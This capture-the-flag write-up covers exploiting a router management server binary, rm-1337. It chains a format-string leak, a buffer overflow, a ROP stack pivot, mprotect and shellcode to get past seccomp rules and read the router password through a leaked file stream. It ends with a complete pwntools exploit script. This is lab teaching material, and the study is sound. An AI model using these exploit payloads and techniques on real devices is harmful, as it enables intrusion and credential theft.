# Synopsis (!)

- Exploiting format string
- Exploiting buffer overflow
- Seccomp rules
- Stack pivot
- Exploiting file descriptor leak 

## Description (!)

- We have found an authenticated rce in the routers of the building we doing red team engagement on , but this is not good enough as they change passwords every week, they all use this router management protocol rm-1337. your mission is to find a way to get the router password so we can chain the two vulnerabilitis in our next engagement.

# Recon

We are provided with two file , A binary which is the RouterManagement-1337 server and it's configuration file , let's start by reading the config file.

```text
# This is a config file for RM-1337
# Comments start with #

[DEVICE]
SSID = L3375 WIFI                                                                   
Encryption = WPA2 
Password = HTB{F4k3_F14g_F0r_T35ting}

[METHODS]
ListAllowedMethods = enabled
ListAllMethods = enabled
SetParameterValue = enabled
GetParameterValue = enabled
GetInformation = enabled

[NETWORK]
HOST = 0.0.0.0
PORT = 1337
```

You can notice that the flag is in the configuration file.

Let's dig in the binary.

```bash
$ file rm-1337
rm-1337: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=90ad65ac92cc4bab48017809b7122de220f0e879, for GNU/Linux 3.2.0, not stripped
```
You can notice it's an x32 binary. also not striped so it will make it easier for static analysis.

```bash
checksec --file=rm-1337
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All protections are enabled, you can't play with GOT as FULL RELRO is enabled.

# Further Analysis

After reversing the binary , We can see some interesting functions.

Config(): This function open a file config.cfg and read the configuration. NOTE: The stream opened with fopen never closed, this can help us.

AddSeccompRules(): This function apply some seccomp rules , lets use `seccomp-tools` to see the rules in a better way.

```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0x40000003  if (A != ARCH_I386) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x04 0x00 0x00000005  if (A == open) goto 0008
 0004: 0x15 0x03 0x00 0x0000000b  if (A == execve) goto 0008
 0005: 0x15 0x02 0x00 0x00000127  if (A == openat) goto 0008
 0006: 0x15 0x01 0x00 0x00000166  if (A == execveat) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0009: 0x06 0x00 0x00 0x00000000  return KILL

```

Next we have two interesting functions. 

GetParameterValue(): This function return what ever is the value of the parameter we choose as we can get three types of parameters , SSID, Encryption and Password, the Encryption is an interger value and it set's the value or return it depend on the int value so not a big deal.
```c
  else {
    iVar2 = strcmp(param_2,"Encryption");
    if (iVar2 == 0) {
      if (DevInfo._504_4_ == 1) {
        sprintf(*param_1,"WEP");
      }
      else if (DevInfo._504_4_ == 2) {
        sprintf(*param_1,"WPA");
      }
      else if (DevInfo._504_4_ == 3) {
        sprintf(*param_1,"WPA1");
      }
      else if (DevInfo._504_4_ == 4) {
        sprintf(*param_1,"WPA2");
      }
      else {
        sprintf(*param_1,"Unknown");
      }
    }
```
There also the Password but it's REDACTED with '*' of the same length of the password, so not really interesting , this leave us with the SSID parameter.

```c
  iVar2 = strcmp(param_2,"SSID");
  if (iVar2 == 0) {
    snprintf(*param_1,0x80,DevInfo + 0xf8);
  }
```
It's write the value of `DevInfo + 0xf8` which is SSID into param_1 as a format. so we have a format string vulnerability here. using this format string vulnerability we will leak libc address, binary address,stack canary and our socket fd since the binary is a server that handle more than one client. NOTE: we will use the socket latter.

SetParameterValue(): Using ChatGPT we can make it more readable.
```c
char *trimmed_input;
int comparison_result;
undefined4 return_value;
int stack_guard_offset;
undefined local_buffer[465];
int stack_guard;

// Save stack guard value for security check
stack_guard = *(int *)(stack_guard_offset + 0x14);

// Send a waiting message
Send(param_2, "[WAITING] \n\r");

// Read input into local buffer
Read(param_2, local_buffer); <-- 

// Trim the input
trimmed_input = (char *)trim(local_buffer);
```

If we decompiled the Read():
```c
ssize_t Read(int socket_fd, void *buffer) {
    ssize_t bytes_received;

    // Receive data from the socket
    bytes_received = recv(socket_fd, buffer, 0x1fe, 0);
    
    // Check for errors
    if (bytes_received < 0) {
        Log("ERROR", "recv failed");
    }
    
    // Null-terminate the received data
    *(char *)((int)buffer + bytes_received + 1) = '\0';

    return bytes_received;
}
```

So it's receive data from our socket end into the buffer passed to Read, which is `local_buffer` from SetParameterValue function , the size of `local_buffer` is 465 bytes, but Read function read 0x1fe which is 510, We have a buffer overflow here.
465 as a Pad + 4 for the stack canary + 12 bytes to reach the return address, this is 481, which leave us with 29 bytes , like 7 gadgets.

We can't get a shell as execve and execveat are disabled , also this is a 32bit binary so we can't trick it by return to 32bit. open and openat are disabled too , we can't open to read the flag from config.cfg, As the rules are enabled after the binary read the files it's need.

If you remember we said that the stream of config.cfg file is never closed , so we can use this to read the config.cfg file again and extract the password.

We will need to leak the heap address of the main thread as the Config() function ran in the main thread and we are in a different one, so the addresses are not the same.

# Writing Exploit
We will start by exploiting the format string to leak the addresses.
```python
# Leaking binary address, stack canary, libc address, socket fd
PAYLOAD = b"%p|%157$p|%168$p|%6$p"
setParam("SSID", PAYLOAD)
leak = getParam("SSID")

leak = leak.rstrip(b"\n").lstrip(b"\r").split(b"|")

BIN_BASE = int(leak[0].decode(), 16) - 0x214b
log.info("Binary base address: {}".format(hex(BIN_BASE)))

BSS = BIN_BASE + 0x6000
log.info("BSS section base address: {}".format(hex(BSS)))

CANARY = int(leak[1].decode(), 16)
log.info("Stack canary: {}".format(hex(CANARY)))

LIBC_BASE = int(leak[2].decode(), 16) - 0x223e34
log.info("Libc base address: {}".format(hex(LIBC_BASE)))

SOCK = int(leak[3].decode(), 16)
log.info("Socket: {}".format(hex(SOCK)))
```

We have Libc address and Binary address so we have a big number of gadgets to use , we can pivot the stack.

We will exploit the buffer overflow in SetParameterValue.SSID method to ROP. 
Start by using the Read() function to read stage 2 into bss and pivot the stack to there.

```python
EXPLOIT  = b"A" * 465
EXPLOIT += p32(CANARY)
EXPLOIT += b"B" * 12

EXPLOIT += Read
EXPLOIT += pop_edi_ebp <- to go to the next instruction and not return into p32(SOCK)
EXPLOIT += p32(SOCK)
EXPLOIT += p32(BSS + 0x300)

EXPLOIT += pop_esp # stack pivot
EXPLOIT += p32(BSS + 0x300)
```

From here you can continue using ROP as creating your full chain in stage 2, but for me it's better to have a shellcode injected. that take use to stage 3

```python
EXPLOIT = mprotect
EXPLOIT += next_inst <- you will find this in the full exploit

EXPLOIT += p32(BSS)
EXPLOIT += p32(0x1000)
EXPLOIT += p32(0x7)

EXPLOIT += Read
EXPLOIT += next_inst
EXPLOIT += p32(SOCK)
EXPLOIT += p32(BSS + 0x500)
EXPLOIT += b"A" * 4

EXPLOIT += pop_eax
EXPLOIT += p32(BSS + 0x500)

EXPLOIT += call_eax
```

Using mprotect to convert bss to executable, and again using Read() to read our shellcode into bss and call it.

```python
# Stage 3
ASM = f"""
    mov esp, {BSS + 0x900}

    xor eax, eax
    xor ebx, ebx

    mov eax, 45
    int 0x80

    sub eax, {HEAP_END_OFFSET_TO_FP}
    push eax

    mov eax, {rewind}
    call eax

    push 0x100
    push {BSS}

read_line:
    mov eax, {fgets}
    call eax
    
    mov ecx, [eax]
    cmp ecx, 0x73736150
    jne read_line
  
    push 0
    push 0x50
    push {BSS}
    push {SOCK}
    
    mov eax, {send}
    call eax
"""
```
For our shellcode we first use `brk` syscall to get the wilderness address of the heap, then calculate the address of the file stream. 
Next we use rewind() c function to convert the file stream to it's original state, as the file stream is used before to read the entire file we can't just use it again , this like seeking to the beginning of the fd.

next we use fgets to read the config file line by line , if it's the Password line then write send it back to use if not then keep reading.

# Final Exploit

```python
#!/usr/bin/python3

from pwn import *
from time import sleep

io = remote("172.17.0.2", 1337)

context.arch = "i386"

def getParam(param):
    io.sendline(b"Command.GetParameterValue." + param.encode())
    io.readline(b"[OK] \n")
    ret = io.readline()
    return ret

def setParam(param, value):
    io.sendline(b"Command.SetParameterValue." + param.encode())
    io.readline()
    io.sendline(value)
    io.readline()


# Leaking binary address, stack canary, libc address, socket fd
PAYLOAD = b"%p|%157$p|%168$p|%6$p"
setParam("SSID", PAYLOAD)
leak = getParam("SSID")

leak = leak.rstrip(b"\n").lstrip(b"\r").split(b"|")

BIN_BASE = int(leak[0].decode(), 16) - 0x214b
log.info("Binary base address: {}".format(hex(BIN_BASE)))

BSS = BIN_BASE + 0x6000
log.info("BSS section base address: {}".format(hex(BSS)))

CANARY = int(leak[1].decode(), 16)
log.info("Stack canary: {}".format(hex(CANARY)))

LIBC_BASE = int(leak[2].decode(), 16) - 0x223e34
log.info("Libc base address: {}".format(hex(LIBC_BASE)))

SOCK = int(leak[3].decode(), 16)
log.info("Socket: {}".format(hex(SOCK)))


# libc functions
mprotect = p32(LIBC_BASE + 0x11fe60)
fgets = LIBC_BASE + 0x73130
rewind = LIBC_BASE + 0x7c3b0
send = LIBC_BASE + 0x1281e0

# libc gadgets
pop_eax = p32(LIBC_BASE + 0x12b1f1)
pop_esp = p32(LIBC_BASE + 0x172428)

# binary functions
Read = p32(BIN_BASE + 0x266d)

# binary gadgets
pop_ebx = p32(BIN_BASE + 0x101e)
pop_edi_ebp = p32(BIN_BASE + 0x1b90)
next_inst = p32(BIN_BASE + 0x101b)

call_eax = p32(BIN_BASE + 0x1019)

EXPLOIT  = b"A" * 465
EXPLOIT += p32(CANARY)
EXPLOIT += b"B" * 12

EXPLOIT += Read
EXPLOIT += pop_edi_ebp
EXPLOIT += p32(SOCK)
EXPLOIT += p32(BSS + 0x300)

EXPLOIT += pop_esp # stack pivot
EXPLOIT += p32(BSS + 0x300)

log.info("Stage 1")
setParam("SSID", EXPLOIT)

EXPLOIT = mprotect
EXPLOIT += next_inst

EXPLOIT += p32(BSS)
EXPLOIT += p32(0x1000)
EXPLOIT += p32(0x7)

EXPLOIT += Read
EXPLOIT += next_inst
EXPLOIT += p32(SOCK)
EXPLOIT += p32(BSS + 0x500)
EXPLOIT += b"A" * 4

EXPLOIT += pop_eax
EXPLOIT += p32(BSS + 0x500)

EXPLOIT += call_eax

log.info("Stage 2")
io.sendline(EXPLOIT)

HEAP_END_OFFSET_TO_FP = 0x21e60

# Stage 3
ASM = f"""
    mov esp, {BSS + 0x900}

    xor eax, eax
    xor ebx, ebx

    mov eax, 45
    int 0x80

    sub eax, {HEAP_END_OFFSET_TO_FP}
    push eax

    mov eax, {rewind}
    call eax

    push 0x100
    push {BSS}

read_line:
    mov eax, {fgets}
    call eax
    
    mov ecx, [eax]
    cmp ecx, 0x73736150
    jne read_line
  
    push 0
    push 0x50
    push {BSS}
    push {SOCK}
    
    mov eax, {send}
    call eax
"""

log.info("Stage 3")
sleep(1)
SHELLCODE = asm(ASM)
io.sendline(SHELLCODE)

io.interactive()

```
